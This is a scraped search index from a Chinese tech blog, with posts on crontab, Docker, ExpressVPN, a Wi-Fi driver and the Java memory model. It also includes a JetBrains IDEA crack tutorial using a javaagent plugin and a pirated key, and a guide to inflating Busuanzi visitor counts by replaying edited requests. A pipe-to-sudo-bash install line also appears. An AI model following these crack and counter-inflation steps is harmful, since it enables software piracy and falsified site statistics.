navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"微服务 java"},{title:"JetBrains IDEA 2020.3.2 破解激活教程",url:"/posts/3644bd49.html",text:'最新公告本教程提供的激活码已失效，建议参考这篇博客，使用最新的方式来激活 JetBrains IDEA 2020.3.2 或者更新的版本。 前言本教程适用于 JetBrains IDEA 2020.3.2 以下所有版本（包括 IDEA 2020 全系列），支持将 IDEA 2020.3.2 激活到 2099 年，亲测激活成功！！！ 资源下载 JetBrains IDEA 下载：官网 JetBrains IDEA&nbsp;破解补丁下载：本站 激活步骤第一步更改 hosts 文件，将 hosts 文件中有关 Jetbrains 的配置行全部删除掉，若没有则请忽略此步骤。Windows 系统的 hosts 文件路径为：C:\\Windows\\System32\\drivers\\etc\\hosts，Linux 和 Mac 系统的 hosts 文件路径为：/etc/hosts，一般情况下只需删除以下两行内容即可： 120.0.0.0 www.jetbrains.com0.0.0.0 account.jetbrains.com 第二步下载安装 JetBrains IDEA，然后启动 IDEA 并选择试⽤（Evaluate for free）模式进⼊软件（如下图），首次启动后的配置项根据自己的需要勾选即可，此步骤不会影响后面破解的过程。假设软件之前已经在试用或者试用过而且过期了，那么可以先删除 IDEA 的所有配置文件，然后再重新启动软件，IDEA 配置文件所在的目录如下： 1234567# Windows系统C:\\Documents and Settings\\Administrator\\.idea-2020.3\\configC:\\Documents and Settings\\Administrator\\.idea-2020.3\\system# Linux/Mac系统~/.config/JetBrains/IntelliJIdea2020.3~/.local/share/JetBrains/IntelliJIdea2020.3 第三步下载并解压破解补丁的压缩文件，得到 BetterIntelliJ.zip 文件和激活 KEY，切记以后不能随意删除或者移动 BetterIntelliJ.zip 文件的位置，否则 IDEA 激活之后还会失效。 第四步JetBrains IDEA 启动后（试用模式），手动选择创建或者打开一个项目，进入到 IDEA 的主界面。在菜单栏导航到：File -&gt; Settings -&gt; Plugins -&gt; Install Plugin From Disk，然后找到 BetterIntelliJ.zip 文件开始安装破解插件。当破解插件安装完成后，手动重启 IDEA 让插件生效，建议检查 IDEA 的进程是否真正关闭了。特别注意，以后不能随意在 IDEA 的插件市场更新 BetterIntelliJ 破解插件的版本，否则 IDEA 的破解激活会失效。 (adsbygoogle = window.adsbygoogle || []).push({}); 第五步检查破解插件是否安装成功，IDEA 的菜单栏导航到：Help -&gt; Edit Custom Vm Options，如果配置文件末尾出现了一行 -javaagent:/xxxx/BetterIntelliJ-1.16.jar，则说明破解插件安装成功。值得一提的是，在 Linux/Mac 64 位系统环境下，破解插件所用的配置文件的路径为 /${HOME}/.config/JetBrains/IntelliJIdea2020.3/idea64.vmoptions，而不是 IDEA 自身安装目录下的 idea64.vmoptions 配置文件。 破解插件在不同系统平台的正确配置如下： 12345# Windows系统-javaagent:C:\\Users\\Public\\.BetterIntelliJ\\BetterIntelliJ-版本号.jar# Linux/Mac系统-javaagent:${HOME}/.BetterIntelliJ/BetterIntelliJ-版本号.jar 第六步IDEA 的菜单导航到：Help -&gt; Register -&gt; Add New License，将破解补丁压缩文件里的激活 KEY 复制到 IDEA 激活码的输入框里，然后点击 Activate 激活按钮即可，如下图所示： 第七步查看 IDEA 是否破解成功，IDEA 的菜单栏导航到：Help -&gt; About，若出现下图的信息则说明破解成功。 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"开发工具"},{title:"Linux 管理 Crontab 服务",url:"/posts/vbd8mmaf.html",text:'前言 本文主要介绍如何在 Linux 系统上安装和管理 Crontab 服务，适用于 Debian 9、CentOS 7 系统。 Crontab 安装Crontab 安装（CentOS 7）1# yum instal crontabs Crontab 安装（Debian 9）1# apt-get install cron Crontab 服务管理Crontab 服务管理（CentOS 7）1234567891011# 启动Crontab服务# systemctl start crond# 关闭Crontab服务# systemctl stop crond# 重启Crontab服务# systemctl restart crond# 查看Crontab服务的运行状态# systemctl status crond Crontab 服务管理（Debian 9）1234567891011121314151617# 启动Crontab服务# service cron start# 关闭Crontab服务# service cron stop# 重启Crontab服务# service cron restart# 查看Crontab服务的运行状态# service cron status# 或者使用以下命令替代# /etc/init.d/cron stop# /etc/init.d/cron start# /etc/init.d/cron status# /etc/init.d/cron restart Crontab 日志管理Crontab 日志管理（CentOS 7）12# 查看Crontab的日志信息# tail -f -n 10 /var/log/cron Crontab 日志管理（Debian 9）123456789101112131415# 安装rsyslog服务# apt-get install rsyslog# 创建Crontab的日志文件# touch /var/log/cron.log# 开启Crontab的日志记录# vim /etc/rsyslog.confcron.* /var/log/cron.log #取消这行内容的注释即可# 启动rsyslog服务# service rsyslog start# 查看Crontab的日志信息# tail -f -n 10 /var/log/cron.log Crontab 任务管理Crontab 任务管理（CentOS 7）12345678910111213141516171819# 编辑并保存当前用户的计划任务# crontab -e# 查看当前用户的所有计划任务# crontab -l# 提示：以下通过Vim编辑器更改配置文件的方式，不一定能让新增的Crontab计划任务生效# 编辑root用户的计划任务（依赖root用户的权限）# vim /var/spool/cron/root# 查看root用户的计划任务（依赖root用户的权限）# cat /var/spool/cron/root# 编辑www用户的计划任务（依赖root或者www用户的权限）# vim /var/spool/cron/www# 查看www用户的计划任务（依赖root或者www用户的权限）# cat /var/spool/cron/www Crontab 任务管理（Debian 9）12345678910111213141516171819# 编辑并保存当前用户的计划任务# crontab -e# 查看当前用户的所有计划任务# crontab -l# 提示：以下通过Vim编辑器更改配置文件的方式，不一定能让新增的Crontab计划任务生效# 编辑root用户的计划任务（依赖root用户的权限）# vim /var/spool/cron/crontabs/root# 查看root用户的计划任务（依赖root用户的权限）# cat /var/spool/cron/crontabs/root# 编辑www用户的计划任务（依赖root或者www用户的权限）# vim /var/spool/cron/crontabs/www# 查看www用户的计划任务（依赖root或者www用户的权限）# cat /var/spool/cron/crontabs/www Shell 脚本添加 Crontab 计划任务12# 添加系统级的计划任务，依赖root用户的权限，同时需要指定以哪个用户来执行计划任务，此方法适用于绝大多数的Linux发行版# echo "0 */2 * * * root /usr/bin/python3 /usr/share/python_scripts/mysql-sync.py" &gt;&gt; /etc/crontab Crontab 的使用命令格式crontab [-u user] file crontab [-u user] [ -e | -l | -r ] -u user：用来设置某个用户的 Crontab 服务 file：命令文件的名称，表示将 file 作为 Crontab 的任务列表文件并载入 Crontab -e：编辑某个用户的 Crontab 配置文件内容。如果不指定用户，则表示编辑当前用户的 Crontab 配置文件 -l：显示某个用户的 Crontab 配置文件内容，如果不指定用户，则表示显示当前用户的 Crontab 配置文件内容 -r：从 /var/spool/cron 目录中删除某个用户的 Crontab 配置文件，如果不指定用户，则默认删除当前用户的 Crontab 配置文件 Crontab 使用格式 第 1 列：分钟 0～59 第 2 列：小时 0～23 第 3 列：日 1～31 第 4 列：月 1～12 第 5 列：星期 0～7 (0 和 7 表示星期天) 第 6 列：需要执行的命令 Crontab 使用案例1234567891011121314151617181920212223242526272829303132333435363738394041424344454647# 每5秒执行一次0/5 * * * * command# 每一小时执行一次0 */1 * * * command# 每天6点执行一次0 6 * * * command# 每天7:50执行一次50 7 * * * command# 每隔45分钟执行一次*/45 * * * * command# 在12月内，每天6点到12点，每隔3个小时0分钟执行一次0 6-12/3 * 12 * command# 每小时的第3和第15分钟执行3,15 * * * * command# 在上午8点到11点的第3和第15分钟执行3,15 8-11 * * * command# 每隔两天的上午8点到11点的第3和第15分钟执行3,15 8-11 */2 * * command# 每周一上午8点到11点的第3和第15分钟执行3,15 8-11 * * 1 command# 每晚的21:30执行30 21 * * * command# 每月1、10、22日的4:45执行45 4 1,10,22 * * command# 每周六、周日的01:10执行10 1 * * 6,0 command# 每天18:00至23:00之间每隔30分钟执行0,30 18-23 * * * command# 每星期六的晚上23:00执行0 23 * * 6 command# 晚上11点到早上7点之间，每隔一小时执行0 23-7 * * * command Docker 构建 Crontab 镜像警告 这里不建议使用 CentOS 镜像，因为 Docker 的官方 CentOS 镜像中没有提供 systemd 服务，虽然有对应的 解决方案，但解决起来稍微复杂了一点 如果基于 CentOS 镜像构建 Crontab 镜像，启动容器时往往会出现错误信息： Failed to get D-Bus connection: Operation not permitted，更多资料可参考 这里 用于构建 Crontab 镜像的 Dockerfile 的内容如下，基于 Debian 9（Stretch）系统 1234567891011121314151617181920212223242526272829303132333435from augurproject/python2-and-3MAINTAINER clay&lt;clay@gmail.com&gt;RUN touch /var/log/cron.logRUN mkdir -p /usr/share/python_scriptsENV workpath /usr/share/python_scriptsWORKDIR $workpathRUN echo "Asia/Shanghai" &gt; /etc/timezoneRUN ln -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtimeRUN cp /etc/apt/sources.list /etc/apt/backup.sources.listRUN echo "deb http://mirrors.163.com/debian/ stretch main non-free contrib" &gt; /etc/apt/sources.listRUN echo "deb http://mirrors.163.com/debian/ stretch-updates main non-free contrib" &gt;&gt; /etc/apt/sources.listRUN echo "deb http://mirrors.163.com/debian/ stretch-backports main non-free contrib" &gt;&gt; /etc/apt/sources.listRUN echo "deb-src http://mirrors.163.com/debian/ stretch main non-free contrib" &gt;&gt; /etc/apt/sources.listRUN echo "deb-src http://mirrors.163.com/debian/ stretch-updates main non-free contrib" &gt;&gt; /etc/apt/sources.listRUN echo "deb-src http://mirrors.163.com/debian/ stretch-backports main non-free contrib" &gt;&gt; /etc/apt/sources.listRUN echo "deb http://mirrors.163.com/debian-security/ stretch/updates main non-free contrib" &gt;&gt; /etc/apt/sources.listRUN echo "deb-src http://mirrors.163.com/debian-security/ stretch/updates main non-free contrib" &gt;&gt; /etc/apt/sources.listRUN apt-get -y update &amp;&amp; apt-get -y upgradeRUN apt-get -y install cron rsyslog apt-utils net-tools telnet wget curl vimRUN apt-get -y autoclean &amp;&amp; apt-get -y autoremoveRUN sed -i "s/#cron./cron./g" /etc/rsyslog.confRUN echo "0 */2 * * * root /usr/bin/python3 /usr/share/python_scripts/mysql-sync.py" &gt;&gt; /etc/crontabRUN echo "59 23 * * * root /usr/bin/python2 /usr/share/python_scripts/mysql-check.py" &gt;&gt; /etc/crontabCMD service rsyslog start &amp;&amp; service cron start &amp;&amp; tail -f -n 20 /var/log/cron.log 将上面的内容保存到 Dockerfile-Crontab 文件中，然后使用以下命令构建 Crontab 镜像 1# docker build -f Dockerfile-Crontab -t clay/crontab:1.0 . 使用 Docker-Compose 来管理 Crontab 镜像，其中 Docker-Compose 的配置文件内容如下 12345678910version: "3.5"services: crontab: image: clay/crontab:1.0 container_name: crontab volumes: - /usr/local/python_scripts:/usr/share/python_scripts restart: always network_mode: bridge 创建并后台启动 Crontab 容器 1# docker-compose up -d Crontab 命令在线生成工具 Crontab Generator 参考资料 Linux 中的 Crontab 定时任务 Crontab 定时任务不执行的一些原因总结 使用 Shell 脚本或命令行添加 Crontab 定时任务 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"linux"},{title:"Centos7 安装 ExpressVPN 客户端",url:"/posts/4d31c632.html",text:'前言ExpressVPN 介绍 ExpressVPN 官网 ExpressVPN 的优势 ExpressVPN 支持的路由器型号 ExpressVPN 支持的所有设备类型 ExpressVPN 支持同一个账号最多 5 个设备同时使用 ExpressVPN 如何支持 5 个以上的设备同时使用一个账号 快速入门ExpressVPN 客户端安装在 ExpressVPN 官网下载 Fedora 64-bit 版的客户端，通过命令安装客户端 1# yum install expressvpn-3.4.2.4-1.x86_64.rpm 激活，只需要拷贝 ExpressVPN 的激活码到终端，然后按下回车键即可 1$ expressvpn activate 可以选择通过共享匿名诊断报告来帮助改进 ExpressVPN ，输入 Y 接受，或输入 n 拒绝 如果希望以后不再选择向 ExpressVPN 发送诊断报告，可以运行以下命令 1$ expressvpn preferences set send_diagnostics false ExpressVPN 客户端卸载1# yum remove expressvpn 值得一提的是，如果日后需要更新 ExpressVPN 的客户端，只需要先卸载旧版的客户端，然后再安装新版的客户端即可 ExpressVPN 客户端连接服务器连接 VPN 服务器，如果是第一次连接，ExpressVPN 将使用 “智能位置” 功能来选择服务器位置，这是根据速度和邻近性等因素推荐的。如果不是第一次连接，ExpressVPN 将连接到最近连接过的服务器位置 1$ expressvpn connect 默认情况下，如果成功连接到 VPN 服务器，在系统的通知面板里将看到一条指示 ExpressVPN 已连接的通知 当单个 ExpressVPN 账号超过 5 台设备同时使用时，终端会输出以下错误日志信息 验证是否可以正常连接到 VPN 服务器 1$ curl -I www.google.com 断开 VPN 连接，可使用以下命令 1$ expressvpn disconnect 进阶使用ExpressVPN 网速测试安装并使用 Speedtest CLI 工具来测试 ExpressVPN 的实际连接速度，也可以直接使用 Speedtest 的 Python 版 或者 Speedtest 的网页版进行测试。 123456789101112131415161718# 卸载其他版本的 Speedtest# rpm -qa | grep speedtest | xargs -I {} sudo yum -y remove {}# 安装 Speedtest# curl -s https://install.speedtest.net/app/cli/install.rpm.sh | sudo bash# yum install speedtest# 开始网速测试$ speedtest# 或者指定 Speedtest 的网速显示单位$ speedtest -u kB/s# 提示：Speedtest CLI 支持的单位如下：Decimal prefix, bits per second: bps, kbps, Mbps, GbpsDecimal prefix, bytes per second: B/s, kB/s, MB/s, GB/sBinary prefix, bits per second: kibps, Mibps, GibpsBinary prefix, bytes per second: kiB/s, MiB/s, GiB/s ExpressVPN 客户端常用管理命令12345678# 显示所有推荐的 VPN 服务器位置$ expressvpn list# 显示所有有效的 VPN 服务器位置$ expressvpn list all# 显示最近连接过的三个 VPN 服务器位置$ expressvpn list recent 12345# 连接到智能推荐的 VPN 服务器位置$ expressvpn connect smart# 连接到特定的 VPN 服务器位置$ expressvpn connect "Hong Kong - 2" 12345678# 设置 ExpressVPN 使用 TCP 作为 VPN 协议$ expressvpn protocol tcp# 设置 ExpressVPN 使用 UDP 作为 VPN 协议$ expressvpn protocol udp# 设置 ExpressVPN 自动选择 VPN 协议，包括 lightway_udp、tcp、udp 协议$ expressvpn protocol auto 12345# 设置 ExpressVPN 在启动时自动连接到上次连接过的 VPN 服务器位置$ expressvpn autoconnect true# 禁用 ExpressVPN 在启动时自动连接$ expressvpn autoconnect false 12345# 查看 ExpressVPN 当前的连接状态$ expressvpn status# 查看 ExpressVPN 的后台服务状态$ systemctl status expressvpn 12345678# 查看 ExpressVPN 当前的配置信息$ expressvpn preferences# 获取 ExpressVPN 特定的配置信息$ expressvpn preferences get desktop_notifications# 设置 ExpressVPN 特定的配置信息$ expressvpn preferences set desktop_notifications false 12# 查看 ExpressVPN 的命令帮助文档$ man expressvpn ExpressVPN Chrome 浏览器插件安装如果希望使用图形用户界面（GUI）来管理 ExpressVPN 的 Linux 客户端，则可以使用适用于 Chrome 的 ExpressVPN 浏览器插件来实现。在 Chrome 的应用商店里安装 ExpressVPN 插件，然后简单配置 Chrome 浏览器插件即可。特别注意，要使用 Chrome 的浏览器插件，需要确保已下载并激活 ExpressVPN 的 Linux 客户端。 高级使用ExpressVPN 使用建议 建议优先使用速度较快的 lightway_udp 协议，其次才是 tcp、udp 协议 Centos 7 安装 ExpressVPN 的客户端后，默认的 VPN 代理是系统全局代理 由于 ExpressVPN 的客户端是系统全局代理，因此不需要额外的配置就可以直接在 Centos 7 系统内的终端、浏览器使用 VPN 代理 由于 ExpressVPN 的客户端是系统全局代理，因此不需要额外的配置就可以直接让 Centos 7 系统内的所有用户直接使用 VPN 代理，包括终端、浏览器 ExpressVPN 客户端的默认配置项如下： 12345678auto_connect falsedesktop_notifications falsedisable_ipv6 trueforce_vpn_dns truelightway_cipher autonetwork_lock defaultpreferred_protocol autosend_diagnostics true Docker 安装 ExpressVPN 构建 Privoxy、Tor、ExpressVPN 的 Docker 镜像 Linux 实现国内外流量分流ExpressVPN 支持在 Windows、Mac、Android、Router 系统上使用隧道分流功能（即国内外流量分流），但不支持在 Linux 系统上使用隧道分流功能。在 Linux 环境下可以尝试通过 Docker + Privoxy + SwitchyOmega（Chrome 浏览器插件） 来实现隧道分流（如下图），Docker 负责运行 ExpressVPN 的服务，Privoxy 负责网络代理，SwitchyOmega 负责国内外流量分流。值得一提的是，使用该方案之后 ExpressVPN 的 Chrome 浏览器插件就无法正常使用了，此时需要从外部连接到 Docker 容器，然后在终端里使用命令行管理 ExpressVPN 的服务，亲测该方案有效。 官方教程与软件下载ExpressVPN 软件下载 ExpressVPN 的 Linux 客户端 ExpressVPN 的 Chrome 插件 ExpressVPN 的 Android 客户端 ExpressVPN 的 Windows 客户端 ExpressVPN 官方教程 Linux 配置 DNS 服务器 Linux 系统使用 ExpressVPN 路由器系统使用 ExpressVPN Windows 系统使用 ExpressVPN Windows、Mac 系统设置 ExpressVPN 隧道分流 参考资料 ExpressVPN 进阶使用教程 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"centos 开发工具"},{title:"不蒜子统计数据更改",url:"/posts/fc73f615.html",text:'前言由于不蒜子统计不对普通用户提供后台管理的功能，当站点的域名更换后，网站以前的所有统计数据都会重置为零。下面将介绍如何使用抓包工具来分析不蒜子统计的 API，进而实现不蒜子统计数据的更改。 Fiddler 下载这里使用了 Fiddler，它是一款流行的抓包工具，可以将网络传输发送与接受的数据包进行截获、重发、编辑、转存等操作。本质上，Fiddler 是通过改写 HTTP 代理，让数据从它那里通过，来监控并且截取到网络数据。 Fiddler 官网下载地址 ：https://www.telerik.com/download/fiddler Fiddler 离线下载地址：https://pan.baidu.com/s/1bpnp3Ef &nbsp;&nbsp;提取码：5skw 抓包分析1）启动 Fiddler 后，打开本地的浏览器访问博客的 URL，此时在 Fiddler 的界面上可以看到有关不蒜子的请求 1https://busuanzi.ibruce.info/busuanzi?jsonpCallback=BusuanziCallback_195655659654 2）观察请求的响应结果，可以发现其中包含了网站访问量的数据，不蒜子统计就是通过这个请求来统计网站的访问量，包括 site_pv、site_uv、page_pv 3）重新发送一条不蒜子请求，右击该请求，选择 Replay –&gt; Reissue Requests 4）查看请求响应的结果，发现 page_pv 和 site_pv 的值都递增了，在网页端查看也确实递增了 (adsbygoogle = window.adsbygoogle || []).push({}); 5）访客数 site_uv 的值，自然就是通过 Cookie 来实现了 6）Cookie 中有三条数据，尝试删除 busuanziId 后再次发送请求。首先选择 Replay –&gt; Reissue and Edit，在 Raw 选项里删去 Cookie 中的 busuanziId 这条数据，然后点击 Run to Completion 即可发送请求 7）从响应结果可以看到 site_uv 已经加 1 了，同时 page_pv 和 site_pv 也会分别加 1 更改统计数据现在就可以使用 Fiddler 的自动批量发包功能来刷访客数和访问量了，值得一提的是，这里也可以使用 JMeter 来刷统计数据。若刷访客数，则选中修改过 Cookie 的请求，右击选择 Replay –&gt; Reissue Sequentially，输入目标访问人数就可以很快刷上去了 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"爬虫"},{title:"HarmonyOS 入门教程之一 HarmonyOS 简介",url:"/posts/658c60f7.html",text:'博客资料 HarmonyOS 官网 HarmonyOS 应用开发官网 HarmonyOS 设备开发官网 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"移动端"},{title:"Linux 安装 RTL8812AU 无线 USB 网卡驱动",url:"/posts/e173757f.html",text:'前言 本文主要介绍如何在 Linux 系统里安装 RTL8812AU 无线 USB 网卡驱动，适用于 Debian、Ubuntu 18/19/20、Centos7/8，其中 Linux 的内核版本必须为大于等于 3.10。 检测系统是否正确识别 RTL8812AU 无线网卡 12# lsusb | grep RTL8812AUBus 003 Device 008: ID 0bda:8812 Realtek Semiconductor Corp. RTL8812AU 802.11a/b/g/n/ac 2T2R DB WLAN Adapter Ubuntu 18/19/20 手动安装 RTL8812AU 无线网卡驱动 12# 系统环境Linux Ubuntu-20 5.4.0-42-generic #46-Ubuntu SMP Fri Jul 10 00:24:02 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux 12345678910111213141516171819# 安装工具软件# apt-get install -y git make# 克隆源码# git clone https://github.com/gnab/rtl8812au.git# 进入源码目录# cd rtl8812au# 编译驱动# make# 安装驱动# cp 8812au.ko /lib/modules/$(uname -r)/kernel/drivers/net/wireless# 更新模块依赖# depmod# 提示：执行完以上步骤后，正常情况下就可以在系统的设置面板里看到 RTL8812AU 无线 USB 网卡搜索到的 WiFi 列表；如果网卡驱动安装后不生效，可以尝试重启系统。 Ubuntu 18/19/20 通过 DKMS 安装 RTL8812AU 无线网卡驱动 当手动安装 RTL8812AU 无线网卡驱动后，如果 Linux 系统的内核版本升级了，那么 RTL8812AU 驱动就会失效，导致需要重新安装驱动才能正常使用无线网卡。为了解决 Linux 系统内核版本升级带来的问题，可以 通过 DKMS 自动重建并安装网卡驱动到新的内核中。值得注意的是，若通过 DKMS 安装网卡驱动，则无需再使用上面的方法手动安装网卡驱动了。 1234567891011121314151617181920# 安装工具软件# apt-get install -y git make build-essential dkms# 克隆源码# git clone https://github.com/gnab/rtl8812au.git# 进入源码目录# cd rtl8812au# 将网卡驱动安装到DKMS（若命令执行出错，请看本文后面给出的解决办法）# make dkms_install# 查看DKMS是否正确安装网卡驱动# dkms status8812au, 4.2.3, 5.4.0-42-generic, x86_64: installed# 配置系统引导时自动加载网卡驱动# echo 8812au | sudo tee -a /etc/modules# 提示：执行完以上步骤后，正常情况下就可以在系统的设置面板里看到 RTL8812AU 无线 USB 网卡搜索到的 WiFi 列表；如果网卡驱动安装后不生效，可以尝试重启系统。 若执行 make dkms_install 命令出现错误 Makefile:1085: *** unterminated call to function \'shell\': missing \')\'. Stop，此时可以更改 Makefile 的文件内容后，再次执行 make dkms_install 等命令。 123456789101112# 进入源码目录# cd rtl8812au# 查看网卡驱动的版本号# cat include/rtw_version.hdefine DRIVERVERSION "v4.2.3"# 编辑Makefile文件，手动指定网卡驱动的具体版本号# vim MakefileDRIVER_VERSION = 4.2.3# 提示：即找到Makefile文件中的 DRIVER_VERSION = $(shell grep "#define DRIVERVERSION" include/rtw_version.h | awk \'{print $$3}\' | tr -d v\\")，并将其修改为 DRIVER_VERSION = 4.2.3 若需要从 DKMS 中卸载网卡驱动，可以执行以下命令： 12345# 进入源码目录# cd rtl8812au# 通过DKMS卸载网卡驱动# make dkms_remove Centos 7/8 YUM 安装 RTL8812AU 无线网卡驱动 由于亲测在 Centos7 系统环境下，通过上述的方法（手动 + DKMS）安装 RTL8812AU 无线网卡的驱动后，无法使无线网卡正常工作，因此可以通过 YUM 包来安装对应的网卡驱动。 12# 系统环境Linux Centos-7 3.10.0-1160.6.1.el7.x86_64 #1 SMP Tue Nov 17 13:59:11 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux 1234567# 安装网卡驱动# yum install kmod-rtl8812au# 查看网卡驱动是否安装成功（正常情况下，需要将无线USB网卡插到电脑上才会显示具体的驱动信息）# lsmod| grep "XX"88XXau 2189305 0cfg80211 710816 1 88XXau 可以使用以下常用的命令来判断 RTL8812AU 无线网卡是否正常工作，当然也可以在系统的设置面板里查看无线网卡的工作状态： 1234567891011# ifconfigwlp0s20u5: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt; mtu 1500inet 192.168.0.117 netmask 255.255.255.0 broadcast 192.168.0.255inet6 fe80::bbf5:446d:e3ec:90fd prefixlen 64 scopeid 0x20inet6 2606:a000:810c:9300:9c04:74bc:9909:73d prefixlen 64 scopeid 0x0inet6 2606:a000:810c:9300::6 prefixlen 128 scopeid 0x0ether c4:41:1e:5d:7f:98 txqueuelen 1000 (Ethernet)RX packets 1480 bytes 999935 (976.4 KiB)RX errors 0 dropped 0 overruns 0 frame 0TX packets 1724 bytes 484480 (473.1 KiB)TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 12345678910# iwconfigwlp0s20u5 IEEE 802.11AC ESSID:"SBG6900AC" Nickname:"WIFI@REALTEK"Mode:Managed Frequency:5.745 GHz Access Point: 5C:E3:0E:96:D7:A0Bit Rate:174 Mb/s Sensitivity:0/0Retry:off RTS thr:off Fragment thr:offEncryption key:------- Security mode:openPower Management:offLink Quality=83/100 Signal level=36/100 Noise level=0/100Rx invalid nwid:0 Rx invalid crypt:0 Rx invalid frag:0Tx excessive retries:0 Invalid misc:0 Missed beacon:0 123# nmcli conNAME UUID TYPE DEVICESBG6900AC fd0097f7-2c89-4a2b-bb8e-a23e5d197ac2 wifi wlp0s20u5 12345# nmcli dev wifiIN-USE SSID MODE CHAN RATE SIGNAL BARS SECURITY TP-LINK_3BC402 Infra 6 270 Mbit/s 47 ▂▄__ -- Tenda_F73CF8 Infra 11 130 Mbit/s 37 ▂▄__ WPA1 WPA2 Tenda_58D840 Infra 10 130 Mbit/s 14 ▂___ WPA1 WPA2 参考资料 https://github.com/gnab/rtl8812au https://github.com/gnab/rtl8812au/issues/208 https://github.com/gnab/rtl8812au/issues/115 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"linux"},{title:"Linux 的 .a、.so 和 .o 文件介绍",url:"/posts/7d3e2801.html",text:'var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"linux系统编程"},{title:"深入理解 Java 内存模型",url:"/posts/5bbede3c.html",text:'前言本文来源自《深入理解 Java 虚拟机》。 物理硬件和内存首先，在单核电脑中处理的问题要简单得多，对内存和硬件的要求，各种方面的考虑没有在多核的情况下复杂。电脑中，CPU 的运行计算速度是非常快的，而其他硬件比如 IO，网络、内存读取等等，跟 CPU 的速度比起来是差几个数量级的。而不管任何操作，几乎是不可能都在 CPU 中完成而不借助于任何其他硬件操作。所以协调 CPU 和各个硬件之间的速度差异是非常重要的，要不然 CPU 就一直在等待，浪费资源。而在多核中，不仅面临如上问题，还有如果多个核用到了同一个数据，如何保证数据的一致性、正确性等问题，也是必须要解决的。目前基于高速缓存的存储交互很好的解决了 CPU 和内存等其他硬件之间的速度矛盾，多核情况下各个处理器（核）都要遵循一定的诸如 MSI、MESI 等协议来保证内存的各个处理器高速缓存和主内存的数据的一致性。 除了增加高速缓存，为了使处理器内部运算单元尽可能被充分利用，处理器还会对输入的代码进行乱序执行（Out-Of-Order 